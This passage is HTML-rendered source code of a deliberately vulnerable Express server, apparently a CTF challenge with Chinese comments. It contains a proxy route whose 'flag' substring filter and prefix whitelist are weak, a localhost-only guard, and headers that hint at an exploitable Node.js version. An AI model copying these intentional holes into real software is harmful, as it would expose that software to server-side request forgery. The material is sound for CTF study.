&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">static&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;views&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;view engine&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;jade&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">check_endpoint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">endpoint&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#00a8c8">of&lt;/span> &lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">endpoint&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">indexOf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag.dat&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/proxy/internal_website/:page&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">available_endpoints&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;public_links&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;source_code&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">params&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">page&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Node-js-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v8.12.0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 版本提示
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setHeader&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;X-Express-Version&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;v4.16.3&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toLowerCase&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 先转小写再判断 不能有flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendStatus&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">403&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">check_endpoint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 白名单审查
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;available_endpoints&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">endpoints&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">JSON&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">stringify&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">available_endpoints&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:5000/&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;proxy&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span> &lt;span style="color:#75715e">// 返回结果
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">statusCode&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">404&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;proxy&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;The resource not found.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Got error: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 返回报错原因
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 检查ip是否为本地
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;::ffff:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">substr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">7&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#75af00">server_ip&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unauthorized&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_notes&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/public_links&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;public_links&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source_code&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;server.js&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">contents&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source_code&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">source&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">contents&lt;/span> &lt;span style="color:#75715e">// 返回源码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">()&lt;/span>
